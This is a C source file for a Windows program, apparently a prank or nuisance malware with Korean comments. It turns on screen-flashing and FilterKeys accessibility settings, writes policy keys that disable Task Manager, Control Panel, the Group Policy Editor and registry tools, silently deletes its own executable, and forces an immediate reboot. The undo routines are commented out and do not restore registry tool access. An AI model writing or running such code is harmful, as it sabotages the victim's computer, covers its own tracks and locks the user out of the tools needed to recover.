#define _CRT_SECURE_NO_WARNINGS
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

#include <strsafe.h>
#include <Windows.h>

void Flash();
void Anti_Flash();
void DisableTaskmanagerAndControlPaneAndLocalGroupPolicyEditorAndWindowsRegistry();
void EnableTaskmanagerAndControlPanelAndLocalGroupPolicyEditor();
void RestartWindows();
void RemoveItself();

int main()
{
	Flash();
	//Anti_Flash();

	DisableTaskmanagerAndControlPaneAndLocalGroupPolicyEditorAndWindowsRegistry();
	//EnableTaskmanagerAndControlPanelAndLocalGroupPolicyEditor();

	RemoveItself();

	RestartWindows();

	return 0;
}

void Flash()
{
	system("REG ADD \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\SoundSentry\" /v Flags /t REG_SZ /d 3 /f"); //소리에 대한 시각적 알림 켜기(소리 탐지)
	system("REG ADD \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\SoundSentry\" /v WindowsEffect /t REG_SZ /d 3 /f"); //시각적 경고 선택 - 바탕 화면 깜박임
	system("REG ADD \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\Keyboard Response\" /v Flags /t REG_SZ /d 115 /f"); //필터 키 켜기

	return;
}

void Anti_Flash()
{
	system("REG DELETE \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\SoundSentry\" /v Flags /f");
	system("REG DELETE \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\SoundSentry\" /v WindowsEffect /f");
	system("REG DELETE \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\Keyboard Response\" /v Flags /f");

	return;
}

void DisableTaskmanagerAndControlPaneAndLocalGroupPolicyEditorAndWindowsRegistry()
{
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f");
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\explorer\" /v nocontrolpanel /t REG_DWORD /d 1 /f");
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\" /v Restrict_Run /t REG_DWORD /d 1 /f");
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f");

	return;
}

void EnableTaskmanagerAndControlPanelAndLocalGroupPolicyEditor()
{
	system("REG DELETE \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f");
	system("REG DELETE \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\explorer\" /v nocontrolpanel /f");
	system("REG DELETE \"HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\" /v Restrict_Run /f");

	return;
}

void RemoveItself()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return;
}

void RestartWindows()
{
	system("shutdown -r -t 0");

	return;
}